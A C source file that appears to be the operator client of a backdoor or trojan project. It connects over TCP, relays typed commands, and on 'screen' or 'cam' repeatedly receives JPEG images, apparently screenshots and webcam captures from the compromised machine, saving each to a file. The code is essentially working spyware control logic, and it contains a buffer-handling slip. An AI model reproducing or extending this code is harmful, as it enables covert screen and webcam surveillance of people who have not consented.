#include "durex.h"

int	create_client(char *addr, uint16_t port)
{
	int					sock;
	struct protoent		*proto;
	struct sockaddr_in	sin;

	if ((proto = getprotobyname("tcp")) == NULL)
	{
		perror("getprotobyname");
		exit(errno);
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, proto->p_proto)) == -1)
	{
		perror("socket");
		exit(errno);
	}
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	if (!strcmp("localhost", addr))
		sin.sin_addr.s_addr = inet_addr("127.0.0.1");
	else
		sin.sin_addr.s_addr = inet_addr(addr);
	if ((connect(sock, (const struct sockaddr *)&sin, sizeof(sin))) == -1)
	{
		perror("connect");
		exit(errno);
	}
	return (sock);
}

int	main(int argc, char **argv)
{
	int			sock;
	char		buff[BUFFSIZE] = {0};
	char		buff_read[BUFFSIZE] = {0};
	ssize_t		ret_read = 0, ret_recv = 0;
	uint16_t	port;
	size_t		size = 0;

	if (argc != 3)
		usage(argv[0]);
	port = is_port_valid(argv);
	sock = create_client((char *)"localhost", port);

	if (sock == -1)
	{
		perror("sock");
		return (false);
	}
	while (true)
	{
		ret_recv = recv(sock, &buff, BUFFSIZE, 0);
		write(1, &buff, ret_recv);
		if ((ret_read = read(0, &buff_read, BUFFSIZE)) == -1)
		{
			perror("read");
			return (errno);
		}
		buff[ret_read -1] = '\0';
		send(sock, &buff_read, strlen(buff_read), 0);

		if (!strcmp(buff_read, "screen\n") || !strcmp(buff_read, "cam\n"))
		{
			for (;;)
			{
				memset(&buff, 0, BUFFSIZE);
				recv(sock, &buff, 6, 0);
				printf("buff = %s\n", buff);
				memset(&buff, 0, BUFFSIZE);
				recv(sock, &buff, 6, 0);
				printf("buff = %s\n", buff);
				int	r_size = atoi(buff);
				int	fd = open("./image.jpeg", O_CREAT | O_RDWR | O_TRUNC, 0666);
				if (fd == -1)
				{
					perror("open");
					exit (errno);
				}
				memset(&buff, 0, BUFFSIZE);
				while (r_size > 0/*(ret_recv = recv(sock, &buff, BUFFSIZE, 0)) > 0*/)
				{
					ret_recv = recv(sock, &buff, BUFFSIZE, 0);
					write(fd, &buff, ret_recv);
					memset(&buff, 0, BUFFSIZE);
					r_size -= ret_recv;
				}
				printf("Screenshot taken.\n");
				close(fd);
				sleep(1);
				if (!strcmp(buff_read, "screen\n"))
					send(sock, "screen\n", 7, 0);
				else
					send(sock, "cam\n", 4, 0);
			}
			/*return (0);*/
		}

		memset(&buff, 0, BUFFSIZE);
		memset(&buff_read, 0, BUFFSIZE);
	}
}
